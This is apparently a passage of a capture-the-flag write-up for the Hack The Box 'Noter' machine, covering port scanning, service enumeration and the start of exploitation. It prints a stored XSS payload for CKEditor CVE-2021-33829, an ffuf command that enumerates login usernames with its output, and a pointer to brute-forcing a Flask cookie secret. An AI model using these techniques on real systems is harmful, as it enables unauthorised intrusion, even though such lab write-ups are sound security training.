EDT Nmap scan report for 10.129.58.132 Host is up (0.038s latency). All 200 scanned ports on 10.129.58.132 are in ignored states. Not shown: 159 closed udp ports (port-unreach), 41 open|filtered udp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 164.86 seconds Enumeration Port 21 - FTP (vsftpd 3.0.3) No anonymous access Port 5000 - HTTP (Werkzeug httpd 2.0.2 (Python 3.8.10)) Browsed port 5000: Registered a new user: 🔑 0xbro password Enumerated VIP function: Enumerated software version: CKEditor 4.6.2 Stored XSS vulnerability (CVE-2021-33829): CVE-2021-33829: Stored XSS Vulnerability Discovered in CKEditor4 Affects Widely-Used CMS Xss<!--{cke_protected} --!><img src=1 onerror=alert(XSS)>-->Attack User Enumeration Existing user: Non existing user: Enumerated existing users: ┌──(maoutis㉿kali)-[/usr/share/wordlists/seclists] └─$ ffuf -w /usr/share/seclists/Usernames/cirt-default-usernames.txt -X POST -d "username=FUZZ&password=xxx" -u http://noter.htb:5000/login -H 'Content-Type: application/x-www-form-urlencoded' -mr "Invalid login" 2 ⨯ /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v1.3.1 Kali Exclusive <3 ________________________________________________ :: Method : POST :: URL : http://noter.htb:5000/login :: Wordlist : FUZZ: /usr/share/seclists/Usernames/cirt-default-usernames.txt :: Header : Content-Type: application/x-www-form-urlencoded :: Data : username=FUZZ&password=xxx :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Regexp: Invalid login ________________________________________________ maoutis [Status: 200, Size: 2028, Words: 432, Lines: 69] blue [Status: 200, Size: 2025, Words: 432, Lines: 69] :: Progress: [829/829] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:03] :: Errors: 0 :: Exploitation Brute-forcing secret key used to generate cookies: flask-cookie-decode GitHub - 